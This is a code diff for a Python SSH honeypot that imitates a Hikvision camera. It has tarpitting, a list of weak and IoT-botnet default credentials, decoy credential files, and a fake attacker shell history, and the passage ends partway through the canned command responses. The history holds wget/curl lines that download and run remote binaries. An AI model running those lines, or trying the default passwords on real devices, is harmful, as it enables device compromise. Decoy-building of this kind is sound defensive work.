@@ -1,593 +1,575 @@
+"""
+ssh_service.py  —  Realistic SSH Honeypot
+Uses Paramiko for real SSH crypto so any client connects successfully.
+Emulates a Hikvision IP camera running BusyBox / Linux armv7l.
+
+Requirements:  pip install paramiko
+"""
+
 import random
 import time
 import socket
 import os
-import hashlib
 import json
 import re
+import threading
 from collections import defaultdict
-import base64
+
+try:
+    import paramiko
+    HAS_PARAMIKO = True
+except ImportError:
+    HAS_PARAMIKO = False
+    print("[!] paramiko missing — run: pip install paramiko")
 
 # ═══════════════════════════════════════════════════════════════════════════
-# ULTIMATE SSH HONEYPOT - Advanced IoT Camera Simulation
+# CONFIG
 # ═══════════════════════════════════════════════════════════════════════════
 
-# ─── Rate Limiting & Tarpit ───────────────────────────────────────────────
-_connection_tracker = defaultdict(list)  # IP -> [timestamps]
-_failed_auth_tracker = defaultdict(int)  # IP -> failed count
-_tarpit_ips = {}  # IP -> tarpit_until_timestamp
-
-RATE_LIMIT_WINDOW = 60  # seconds
-MAX_CONNECTIONS_PER_MINUTE = 10
+RATE_LIMIT_WINDOW             = 60
+MAX_CONNECTIONS_PER_MINUTE    = 15
 MAX_FAILED_AUTH_BEFORE_TARPIT = 5
-TARPIT_DURATION = 300  # 5 minutes
-TARPIT_DELAY_PER_PACKET = 2.0  # seconds
+TARPIT_DURATION               = 300
+TARPIT_DELAY                  = 1.5
 
-def _should_tarpit(ip):
-    """Check if IP should be tarpitted (slowed down)"""
+# Persistent RSA host key — generated once, saved next to this file
+_KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ssh_host_rsa_key")
+
+# ═══════════════════════════════════════════════════════════════════════════
+# RATE LIMITING / TARPIT
+# ═══════════════════════════════════════════════════════════════════════════
+
+_conn_tracker   = defaultdict(list)
+_failed_tracker = defaultdict(int)
+_tarpit_until   = {}
+
+def _should_tarpit(ip: str) -> bool:
     now = time.time()
-    
-    # Check if currently tarpitted
-    if ip in _tarpit_ips:
-        if now < _tarpit_ips[ip]:
+    if ip in _tarpit_until:
+        if now < _tarpit_until[ip]:
             return True
-        else:
-            del _tarpit_ips[ip]
-            _failed_auth_tracker[ip] = 0
-    
-    # Check failed auth count
-    if _failed_auth_tracker[ip] >= MAX_FAILED_AUTH_BEFORE_TARPIT:
-        _tarpit_ips[ip] = now + TARPIT_DURATION
+        del _tarpit_until[ip]
+        _failed_tracker[ip] = 0
+    if _failed_tracker[ip] >= MAX_FAILED_AUTH_BEFORE_TARPIT:
+        _tarpit_until[ip] = now + TARPIT_DURATION
         return True
-    
-    # Check connection rate
-    _connection_tracker[ip] = [t for t in _connection_tracker[ip] if now - t < RATE_LIMIT_WINDOW]
-    if len(_connection_tracker[ip]) >= MAX_CONNECTIONS_PER_MINUTE:
-        _tarpit_ips[ip] = now + TARPIT_DURATION
+    _conn_tracker[ip] = [t for t in _conn_tracker[ip] if now - t < RATE_LIMIT_WINDOW]
+    if len(_conn_tracker[ip]) >= MAX_CONNECTIONS_PER_MINUTE:
+        _tarpit_until[ip] = now + TARPIT_DURATION
         return True
-    
-    _connection_tracker[ip].append(now)
+    _conn_tracker[ip].append(now)
     return False
 
-# ─── SSH Host Key Fingerprinting ──────────────────────────────────────────
-# Generate consistent host keys per honeypot instance
-_HOST_KEY_RSA = os.urandom(32)
-_HOST_KEY_FINGERPRINT_MD5 = hashlib.md5(_HOST_KEY_RSA).hexdigest()
-_HOST_KEY_FINGERPRINT_SHA256 = base64.b64encode(hashlib.sha256(_HOST_KEY_RSA).digest()).decode().rstrip('=')
+# ═══════════════════════════════════════════════════════════════════════════
+# PERSISTENT RSA HOST KEY
+# ═══════════════════════════════════════════════════════════════════════════
 
-def _get_ssh_host_key_fingerprint():
-    """Return SSH host key fingerprint (like real SSH server)"""
-    # Format like real SSH: "2048 SHA256:abc123... root@hostname (RSA)"
-    return f"2048 SHA256:{_HOST_KEY_FINGERPRINT_SHA256} root@camera (RSA)"
+_host_key      = None
+_host_key_lock = threading.Lock()
 
-# ─── SSH Banners (IoT-specific versions) ──────────────────────────────────
-_SSH_BANNERS = [
-    b"SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7\r\n",
-    b"SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1\r\n",
-    b"SSH-2.0-dropbear_2022.82\r\n",
-    b"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13\r\n",
-    b"SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3\r\n",
-    b"SSH-2.0-ROSSSH\r\n",  # Hikvision custom SSH
+def _get_host_key():
+    global _host_key
+    with _host_key_lock:
+        if _host_key is None:
+            if os.path.exists(_KEY_FILE):
+                _host_key = paramiko.RSAKey.from_private_key_file(_KEY_FILE)
+            else:
+                _host_key = paramiko.RSAKey.generate(2048)
+                _host_key.write_private_key_file(_KEY_FILE)
+                os.chmod(_KEY_FILE, 0o600)
+    return _host_key
+
+# ═══════════════════════════════════════════════════════════════════════════
+# SSH BANNERS
+# ═══════════════════════════════════════════════════════════════════════════
+
+_BANNERS = [
+    "SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7",
+    "SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1",
+    "SSH-2.0-dropbear_2022.82",
+    "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13",
+    "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3",
+    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
 ]
 
-# ─── Weak Credentials (expanded) ──────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# CREDENTIALS ACCEPTED BY THE HONEYPOT
+# ═══════════════════════════════════════════════════════════════════════════
+
 WEAK_CREDENTIALS = {
-    "root": ["root", "toor", "admin", "password", "12345", "123456", "rootroot", "raspberry", "alpine", "vizxv", "xc3511", "juantech", "anko", "Zte521", ""],
-    "admin": ["admin", "password", "12345", "123456", "admin123", "administrator", "smcadmin", "1234", ""],
-    "pi": ["raspberry", "pi", "123456", "password", ""],
-    "user": ["user", "password", "12345", ""],
-    "ubuntu": ["ubuntu", "password", "123456", ""],
-    "support": ["support", "password", "12345", ""],
-    "service": ["service", "12345", "password", ""],
-    "guest": ["guest", "password", "12345", ""],
-    "hikvision": ["hikvision", "12345", ""],
-    "default": ["default", "12345", ""],
+    "root":      ["root","toor","admin","password","12345","123456","1234",
+                  "rootroot","raspberry","alpine","vizxv","xc3511","juantech",
+                  "anko","Zte521","pass","test","qwerty","letmein",""],
+    "admin":     ["admin","password","12345","123456","admin123","1234",
+                  "administrator","smcadmin","Admin@2024","admin@123",""],
+    "pi":        ["raspberry","pi","123456","password",""],
+    "user":      ["user","password","12345","1234",""],
+    "ubuntu":    ["ubuntu","password","123456",""],
+    "support":   ["support","password","12345","support123",""],
+    "service":   ["service","12345","password",""],
+    "guest":     ["guest","password","12345","guest123",""],
+    "operator":  ["operator","1234","password",""],
+    "hikvision": ["hikvision","12345","hik12345",""],
+    "default":   ["default","12345","password",""],
+    "ubnt":      ["ubnt",""],
+    "tech":      ["tech","1234"],
 }
 
-# ─── Shell Prompts (IoT-specific) ─────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# SHELL PROMPTS
+# ═══════════════════════════════════════════════════════════════════════════
+
 _PROMPTS = [
-    "# ",
     "root@DVR:~# ",
     "root@IPC:~# ",
-    "/ # ",
-    "[root@camera]# ",
+    "[root@camera ~]# ",
     "root@(none):/# ",
-    "HiLinux # ",
+    "root@HiLinux:~# ",
+    "# ",
 ]
 
 # ═══════════════════════════════════════════════════════════════════════════
-# IoT-Specific File System & Commands
+# FAKE IoT FILESYSTEM  (honeytoken files included)
 # ═══════════════════════════════════════════════════════════════════════════
 
-# IoT device configuration files (honeytokens)
-_IOT_FILES = {
-    "/.dvr_config": """[System]
-DeviceType=NVR
-Model=DS-2CD2043G2-I
-SerialNumber=DS-2CD2043G2-I20230313BBRR012345
-FirmwareVersion=V5.7.15 build 230313
-
-[Network]
-IP=192.168.1.108
-MAC=44:19:B6:7A:2C:D9
-Gateway=192.168.1.1
-DNS1=8.8.8.8
-
-[Admin]
-Username=admin
-Password=Admin@2024!
-EnableSSH=true
-""",
-    
-    "/etc/hikvision.conf": """DEVICE_MODEL=DS-2CD2043G2-I
-FIRMWARE=V5.7.15
-ADMIN_USER=admin
-ADMIN_PASS=Admin@2024!
-RTSP_PORT=554
-HTTP_PORT=80
-ONVIF_PORT=8000
-""",
-    
-    "/etc/passwd": """root:x:0:0:root:/root:/bin/ash
-daemon:x:1:1:daemon:/usr/sbin:/bin/false
-bin:x:2:2:bin:/bin:/bin/false
-sys:x:3:3:sys:/dev:/bin/false
-admin:x:500:500:System Administrator:/home/admin:/bin/ash
-nobody:x:65534:65534:nobody:/nonexistent:/bin/false
-""",
-    
-    "/etc/shadow": """root:$1$abc123$hashhashhashhash:18000:0:99999:7:::
-admin:$1$xyz789$hashhashhashhash:18000:0:99999:7:::
-""",
-    
-    "/mnt/dvr/recordings/": """total 0
-drwxr-xr-x 2 root root 4096 Mar 19 10:00 .
-drwxr-xr-x 3 root root 4096 Mar 19 10:00 ..
--rw-r--r-- 1 root root 2147483648 Mar 19 10:00 record_20260319_100000.mp4
--rw-r--r-- 1 root root 2147483648 Mar 19 09:00 record_20260319_090000.mp4
-""",
-    
-    "/tmp/": """total 0
-drwxrwxrwt 2 root root 4096 Mar 19 10:00 .
-drwxr-xr-x 3 root root 4096 Mar 19 10:00 ..
-""",
+_FS = {
+    "/etc/hostname":  "IPC\n",
+    "/etc/issue":     "Hikvision Embedded Linux \\n \\l\n",
+    "/etc/motd":      "Welcome to Hikvision IP Camera\nFirmware: V5.7.15 build 230313\n\n",
+    "/etc/os-release": (
+        'NAME="HiLinux"\nVERSION="1.0"\nID=hilinux\n'
+        'PRETTY_NAME="Hikvision HiLinux 1.0"\n'
+    ),
+    "/etc/passwd": (
+        "root:x:0:0:root:/root:/bin/ash\n"
+        "daemon:x:1:1:daemon:/usr/sbin:/bin/false\n"
+        "bin:x:2:2:bin:/bin:/bin/false\n"
+        "sys:x:3:3:sys:/dev:/bin/false\n"
+        "admin:x:500:500:System Administrator:/home/admin:/bin/ash\n"
+        "nobody:x:65534:65534:nobody:/nonexistent:/bin/false\n"
+    ),
+    "/etc/shadow": (                    # HONEYTOKEN
+        "root:$1$Hik2024.$hashhashhashhash123456:18000:0:99999:7:::\n"
+        "admin:$1$xyz789.$hashhashhashhash654321:18000:0:99999:7:::\n"
+    ),
+    "/etc/group": "root:x:0:\nadmin:x:500:\ndaemon:x:1:\nbin:x:2:\n",
+    "/etc/hikvision.conf": (            # HONEYTOKEN
+        "DEVICE_MODEL=DS-2CD2043G2-I\n"
+        "FIRMWARE=V5.7.15\n"
+        "ADMIN_USER=admin\n"
+        "ADMIN_PASS=Admin@2024!\n"
+        "RTSP_PORT=554\nHTTP_PORT=80\nONVIF_PORT=8000\n"
+        "SERIAL=DS-2CD2043G2-I20230313BBRR012345\n"
+    ),
+    "/.dvr_config": (                   # HONEYTOKEN
+        "[System]\nDeviceType=NVR\nModel=DS-2CD2043G2-I\n"
+        "SerialNumber=DS-2CD2043G2-I20230313BBRR012345\n"
+        "FirmwareVersion=V5.7.15 build 230313\n\n"
+        "[Network]\nIP=192.168.1.108\nMAC=44:19:B6:7A:2C:D9\n"
+        "Gateway=192.168.1.1\nDNS1=8.8.8.8\n\n"
+        "[Admin]\nUsername=admin\nPassword=Admin@2024!\nEnableSSH=true\n"
+    ),
+    "/root/.env": (                     # HONEYTOKEN
+        "ADMIN_PASS=Admin@2024!\nDB_HOST=192.168.1.50\n"
+        "DB_PASS=SuperSecret2024!\n"
+        "API_KEY=sk-proj-abc123xyz789def456ghi\n"
+        "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
+        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
+        "SMTP_PASS=MailPass2024!\n"
+    ),
+    "/root/.ssh/authorized_keys": (
+        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2... admin@camera\n"
+    ),
+    "/root/.bash_history": (            # HONEYTOKEN — shows prior attacker cmds
+        "ls /\ncat /etc/passwd\ncat /etc/shadow\nifconfig\nps aux\n"
+        "wget http://192.168.1.200/update.sh\n"
+        "chmod +x update.sh && ./update.sh\n"
+        "cd /tmp && ls\n"
+        "curl http://45.33.32.156/mips -o /tmp/m && chmod 777 /tmp/m && /tmp/m\n"
+        "history -c\n"
+    ),
+    "/proc/cpuinfo": (
+        "processor\t: 0\nmodel name\t: ARMv7 Processor rev 4 (v7l)\n"
+        "BogoMIPS\t: 1600.00\n"
+        "Features\t: swp half thumb fastmult vfp edsp neon vfpv3\n"
+        "CPU implementer\t: 0x41\nCPU architecture: 7\n"
+        "CPU variant\t: 0x0\nCPU part\t: 0xc07\nCPU revision\t: 4\n\n"
+        "Hardware\t: Hikvision IPCamera\nRevision\t: 0000\n"
+        "Serial\t\t: 0000000000000000\n"
+    ),
+    "/proc/meminfo": (
+        "MemTotal:         524288 kB\nMemFree:          128000 kB\n"
+        "MemAvailable:     256000 kB\nBuffers:           16384 kB\n"
+        "Cached:            98304 kB\nSwapCached:            0 kB\n"
+        "Active:           163840 kB\nInactive:          81920 kB\n"
+        "SwapTotal:             0 kB\nSwapFree:              0 kB\n"
+    ),
+    "/proc/version": (
+        "Linux version 3.10.14 (builder@hikvision) "
+        "(gcc version 4.8.3 20140320 (prerelease)) "
+        "#1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021\n"
+    ),
+    "/proc/mounts": (
+        "/dev/root / ext4 ro,relatime 0 0\n"
+        "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
+        "sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0\n"
+        "tmpfs /tmp tmpfs rw,relatime 0 0\n"
+        "/dev/mtdblock5 /mnt/dvr ext4 rw,relatime 0 0\n"
+    ),
+    "/proc/uptime": "3888000.12 3110400.09\n",
+    "/mnt/dvr/recordings/": (
+        "total 4194304\n"
+        "drwxr-xr-x 2 root root       4096 Mar 19 10:00 .\n"
+        "drwxr-xr-x 3 root root       4096 Mar 19 10:00 ..\n"
+        "-rw-r--r-- 1 root root 2147483648 Mar 19 10:00 record_20260319_100000.mp4\n"
+        "-rw-r--r-- 1 root root 2147483648 Mar 19 09:00 record_20260319_090000.mp4\n"
+        "-rw-r--r-- 1 root root 2147483648 Mar 19 08:00 record_20260319_080000.mp4\n"
+    ),
+    "/tmp/": (
+        "total 0\n"
+        "drwxrwxrwt 2 root root 4096 Mar 19 10:00 .\n"
+        "drwxr-xr-x 3 root root 4096 Mar 19 10:00 ..\n"
+    ),
 }
 
-# Expanded shell commands (IoT-specific)
-_COMMAND_RESPONSES = {
-    "uname": "Linux\r\n",
-    "uname -a": "Linux IPC 3.10.14 #1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021 armv7l GNU/Linux\r\n",
-    "uname -r": "3.10.14\r\n",
-    "uname -m": "armv7l\r\n",
-    
-    "cat /proc/cpuinfo": """processor\t: 0
-model name\t: ARMv7 Processor rev 4 (v7l)
-BogoMIPS\t: 1600.00
-Features\t: swp half thumb fastmult vfp edsp neon vfpv3
-CPU implementer\t: 0x41
-CPU architecture: 7
-CPU variant\t: 0x0
-CPU part\t: 0xc07
-CPU revision\t: 4
-
-Hardware\t: Hikvision IPCamera
-Revision\t: 0000
-Serial\t\t: 0000000000000000
-""",
-    
-    "cat /proc/meminfo": """MemTotal:         524288 kB
-MemFree:          128000 kB
-MemAvailable:     256000 kB
-Buffers:           16384 kB
-Cached:            98304 kB
-SwapCached:            0 kB
-Active:           163840 kB
-Inactive:          81920 kB
-""",
-    
-    "cat /proc/mounts": """/dev/root / ext4 ro,relatime 0 0
-proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
-sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
-tmpfs /tmp tmpfs rw,relatime 0 0
-/dev/mtdblock5 /mnt/dvr ext4 rw,relatime 0 0
-""",
-    
-    "cat /proc/version": "Linux version 3.10.14 (builder@hikvision) (gcc version 4.8.3 20140320 (prerelease)) #1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021\r\n",
-    
-    "id": "uid=0(root) gid=0(root) groups=0(root)\r\n",
-    "whoami": "root\r\n",
-    "pwd": "/root\r\n",
-    
-    "ls": "bin  dev  etc  home  lib  mnt  proc  root  sbin  sys  tmp  usr  var\r\n",
-    "ls -l": """total 0
-drwxr-xr-x  2 root root  4096 Oct 19  2021 bin
-drwxr-xr-x  4 root root  4096 Mar 19 10:00 dev
-drwxr-xr-x  5 root root  4096 Oct 19  2021 etc
-drwxr-xr-x  3 root root  4096 Oct 19  2021 home
-drwxr-xr-x  5 root root  4096 Oct 19  2021 lib
-drwxr-xr-x  3 root root  4096 Mar 19 10:00 mnt
-dr-xr-xr-x 78 root root     0 Mar 19 10:00 proc
-drwx------  2 root root  4096 Oct 19  2021 root
-drwxr-xr-x  2 root root  4096 Oct 19  2021 sbin
-dr-xr-xr-x 13 root root     0 Mar 19 10:00 sys
-drwxrwxrwt  2 root root  4096 Mar 19 10:00 tmp
-drwxr-xr-x  7 root root  4096 Oct 19  2021 usr
-drwxr-xr-x  5 root root  4096 Oct 19  2021 var
-""",
-    
-    "ls /": "bin  dev  etc  home  lib  mnt  proc  root  sbin  sys  tmp  usr  var\r\n",
-    "ls /mnt": "dvr\r\n",
-    "ls /mnt/dvr": "recordings  config\r\n",
-    
-    "ps": """  PID USER       VSZ STAT COMMAND
-    1 root      1040 S    init
-  123 root      2048 S    /sbin/syslogd
-  234 root      3072 S    /usr/sbin/sshd
-  345 root      4096 S    /usr/sbin/httpd
-  456 root      8192 S    /usr/bin/ipc_server
-  567 root     16384 S    /usr/bin/rtsp_server
-  678 root      2048 S    /bin/sh
-""",
-    
-    "ps aux": """USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root         1  0.0  0.1   1040   256 ?        S    Oct19   0:00 init
-root       123  0.0  0.2   2048   512 ?        S    Oct19   0:00 /sbin/syslogd
-root       234  0.1  0.3   3072   768 ?        S    Oct19   0:12 /usr/sbin/sshd
-root       345  0.2  0.4   4096  1024 ?        S    Oct19   0:34 /usr/sbin/httpd
-root       456  1.2  1.6   8192  4096 ?        S    Oct19   5:67 /usr/bin/ipc_server
-root       567  0.8  3.2  16384  8192 ?        S    Oct19   3:45 /usr/bin/rtsp_server
-""",
-    
-    "ps -ef": """UID        PID  PPID  C STIME TTY          TIME CMD
-root         1     0  0 Oct19 ?        00:00:00 init
-root       123     1  0 Oct19 ?        00:00:00 /sbin/syslogd
-root       234     1  0 Oct19 ?        00:00:12 /usr/sbin/sshd
-root       345     1  0 Oct19 ?        00:00:34 /usr/sbin/httpd
-root       456     1  1 Oct19 ?        05:67:89 /usr/bin/ipc_server
-root       567     1  0 Oct19 ?        03:45:12 /usr/bin/rtsp_server
-""",
-    
-    "ifconfig": """eth0      Link encap:Ethernet  HWaddr 44:19:B6:7A:2C:D9
-          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
-          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:123456 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:654321 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1000
-          RX bytes:98765432 (94.1 MiB)  TX bytes:12345678 (11.7 MiB)
-
-lo        Link encap:Local Loopback
-          inet addr:127.0.0.1  Mask:255.0.0.0
-          UP LOOPBACK RUNNING  MTU:65536  Metric:1
-""",
-    
-    "ip addr": """1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
-    link/ether 44:19:b6:7a:2c:d9 brd ff:ff:ff:ff:ff:ff
-    inet 192.168.1.108/24 brd 192.168.1.255 scope global eth0
-""",
-    
-    "netstat -an": """Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:554             0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN
-tcp        0      0 192.168.1.108:22        192.168.1.1:54321       ESTABLISHED
-""",
-    
-    "free": """             total       used       free     shared    buffers     cached
-Mem:        524288     396288     128000          0      16384      98304
--/+ buffers/cache:     281600     242688
-Swap:            0          0          0
-""",
-    
-    "df": """Filesystem           1K-blocks      Used Available Use% Mounted on
-/dev/root               524288    393216    131072  75% /
-tmpfs                   262144      1024    261120   1% /tmp
-/dev/mtdblock5         2097152   1048576   1048576  50% /mnt/dvr
-""",
-    
-    "df -h": """Filesystem                Size      Used Available Use% Mounted on
-/dev/root               512.0M    384.0M    128.0M  75% /
-tmpfs                   256.0M      1.0M    255.0M   1% /tmp
-/dev/mtdblock5            2.0G      1.0G      1.0G  50% /mnt/dvr
-""",
-    
-    "mount": """/dev/root on / type ext4 (ro,relatime)
-proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
-sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
-tmpfs on /tmp type tmpfs (rw,relatime)
-/dev/mtdblock5 on /mnt/dvr type ext4 (rw,relatime)
-""",
-    
-    "dmesg | tail": """[    0.000000] Linux version 3.10.14 (builder@hikvision)
-[    0.000000] CPU: ARMv7 Processor [410fc075] revision 5 (ARMv7), cr=10c5387d
-[    1.234567] Hikvision IPCamera platform initialized
-[    2.345678] eth0: link up, 100Mbps, full-duplex
-[    3.456789] RTSP server starting on port 554
-[    4.567890] HTTP server starting on port 80
-[    5.678901] Camera module initialized: DS-2CD2043G2-I
-[    6.789012] Recording service started
-[    7.890123] ONVIF service ready on port 8000
-""",
-    
-    "uptime": " 10:00:00 up 45 days,  3:21,  1 user,  load average: 0.12, 0.08, 0.05\r\n",
-    
-    "date": time.strftime("%a %b %d %H:%M:%S UTC %Y\r\n", time.gmtime()),
-    
-    "hostname": "IPC\r\n",
-    
-    "busybox": "BusyBox v1.31.1 (2021-10-19 08:36:54 UTC) multi-call binary.\r\nBusyBox is copyrighted by many authors between 1998-2015.\r\n",
-    
-    "cat /etc/motd": "Welcome to Hikvision IP Camera\r\nFirmware: V5.7.15 build 230313\r\n",
-    
-    "cat /etc/issue": "Hikvision Embedded Linux\r\n",
-    
-    "cat /etc/hostname": "IPC\r\n",
-    
-    "env": """HOME=/root
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-SHELL=/bin/ash
-TERM=xterm
-USER=root
-LOGNAME=root
-PWD=/root
-DEVICE_MODEL=DS-2CD2043G2-I
-FIRMWARE_VERSION=V5.7.15
-""",
-    
-    "printenv": """HOME=/root
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-SHELL=/bin/ash
-USER=root
-""",
+# ─── Directory listings ────────────────────────────────────────────────────
+_DIRS = {
+    "/":          "bin  dev  etc  home  lib  mnt  proc  root  sbin  sys  tmp  usr  var\n",
+    "/etc":       "group  hikvision.conf  hostname  hosts  issue  motd  os-release  passwd  shadow\n",
+    "/root":      ".bash_history  .env  .ssh\n",
+    "/root/.ssh": "authorized_keys  known_hosts\n",
+    "/mnt":       "dvr\n",
+    "/mnt/dvr":   "config  recordings\n",
+    "/tmp":       "\n",
+    "/bin":       "ash  busybox  cat  chmod  cp  df  echo  grep  kill  ls  mkdir  mount  mv  ps  rm  sh  uname\n",
+    "/usr/bin":   "curl  env  find  id  top  wget  whoami\n",
+    "/sbin":      "ifconfig  init  reboot  syslogd\n",
+    "/usr/sbin":  "httpd  sshd  telnetd\n",
+    "/var/log":   "auth.log  messages  syslog\n",
 }
 
-# ─── Session Replay Database ──────────────────────────────────────────────
-_session_replay_db = []  # List of previous attack sessions
-MAX_REPLAY_SESSIONS = 50
-
-def _save_session_for_replay(session_data):
-    """Save interesting attack sessions for replay"""
-    if len(session_data.get("commands", [])) >= 3:  # Only save sessions with 3+ commands
-        _session_replay_db.append({
-            "username": session_data.get("username"),
-            "password": session_data.get("password"),
-            "commands": session_data.get("commands", []),
-            "timestamp": time.time(),
-        })
-        
-        # Keep only last N sessions
-        if len(_session_replay_db) > MAX_REPLAY_SESSIONS:
-            _session_replay_db.pop(0)
-
-def _should_replay_session():
-    """Randomly decide if we should replay a previous session (5% chance)"""
-    return _session_replay_db and random.random() < 0.05
-
-def _get_replay_session():
-    """Get a random previous session to replay"""
-    if _session_replay_db:
-        return random.choice(_session_replay_db)
-    return None
+# ─── Static command responses ──────────────────────────────────────────────
+_CMD = {
+    "id":           "uid=0(root) gid=0(root) groups=0(root)\n",
+    "whoami":       "root\n",
+    "pwd":          "/root\n",
+    "hostname":     "IPC\n",
+    "uname":        "Linux\n",
+    "uname -a":     "Linux IPC 3.10.14 #1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021 armv7l GNU/Linux\n",
+    "uname -r":     "3.10.14\n",
+    "uname -m":     "armv7l\n",
+    "uname -s":     "Linux\n",
+    "uname -n":     "IPC\n",
+    "busybox":      "BusyBox v1.31.1 (2021-10-19 08:36:54 UTC) multi-call binary.\n",
+    "uptime":       " 10:00:00 up 45 days,  3:21,  1 user,  load average: 0.12, 0.08, 0.05\n",
+    "date":         time.strftime("%a %b %d %H:%M:%S UTC %Y\n", time.gmtime()),
+    "env": (
+        "HOME=/root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
+        "SHELL=/bin/ash\nTERM=xterm\nUSER=root\nLOGNAME=root\nPWD=/root\n"
+        "DEVICE_MODEL=DS-2CD2043G2-I\nFIRMWARE_VERSION=V5.7.15\n"
+    ),
+    "printenv": (
+        "HOME=/root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
+        "SHELL=/bin/ash\nUSER=root\nPWD=/root\n"
+    ),
+    "ps": (
+        "  PID USER       VSZ STAT COMMAND\n"
+        "    1 root      1040 S    init\n"
+        "  123 root      2048 S    /sbin/syslogd\n"
+        "  234 root      3072 S    /usr/sbin/sshd\n"
+        "  345 root      4096 S    /usr/sbin/httpd\n"
+        "  456 root      8192 S    /usr/bin/ipc_server\n"
+        "  567 root     16384 S    /usr/bin/rtsp_server\n"
+        "  678 root      2048 S    /bin/sh\n"
+        "  999 root       512 R    ps\n"
+    ),
+    "ps aux": (
+        "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
+        "root         1  0.0  0.1   1040   256 ?        S    Oct19   0:00 init\n"
+        "root       123  0.0  0.2   2048   512 ?        S    Oct19   0:00 /sbin/syslogd\n"
+        "root       234  0.1  0.3   3072   768 ?        S    Oct19   0:12 /usr/sbin/sshd\n"
+        "root       345  0.2  0.4   4096  1024 ?        S    Oct19   0:34 /usr/sbin/httpd\n"
+        "root       456  1.2  1.6   8192  4096 ?        S    Oct19   5:23 /usr/bin/ipc_server\n"
+        "root       567  0.8  3.2  16384  8192 ?        S    Oct19   3:45 /usr/bin/rtsp_server\n"
+        "root       999  0.0  0.1    512   128 pts/0    R+   10:00   0:00 ps aux\n"
+    ),
+    "ps -ef": (
+        "UID        PID  PPID  C STIME TTY          TIME CMD\n"
+        "root         1     0  0 Oct19 ?        00:00:00 init\n"
+        "root       123     1  0 Oct19 ?        00:00:00 /sbin/syslogd\n"
+        "root       234     1  0 Oct19 ?        00:00:12 /usr/sbin/sshd\n"
+        "root       345     1  0 Oct19 ?        00:00:34 /usr/sbin/httpd\n"
+        "root       456     1  1 Oct19 ?        05:23:45 /usr/bin/ipc_server\n"
+        "root       567     1  0 Oct19 ?        03:45:12 /usr/bin/rtsp_server\n"
+    ),
+    "ifconfig": (
+        "eth0      Link encap:Ethernet  HWaddr 44:19:B6:7A:2C:D9\n"
+        "          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0\n"
+        "          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n"
+        "          RX packets:123456 errors:0 dropped:0 overruns:0 frame:0\n"
+        "          TX packets:654321 errors:0 dropped:0 overruns:0 carrier:0\n"
+        "          collisions:0 txqueuelen:1000\n"
+        "          RX bytes:98765432 (94.1 MiB)  TX bytes:12345678 (11.7 MiB)\n\n"
+        "lo        Link encap:Local Loopback\n"
+        "          inet addr:127.0.0.1  Mask:255.0.0.0\n"
+        "          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n"
+    ),
+    "ip addr": (
+        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n"
+        "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
+        "    inet 127.0.0.1/8 scope host lo\n"
+        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000\n"
+        "    link/ether 44:19:b6:7a:2c:d9 brd ff:ff:ff:ff:ff:ff\n"
+        "    inet 192.168.1.108/24 brd 192.168.1.255 scope global eth0\n"
+    ),
+    "ip link": (
+        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n"
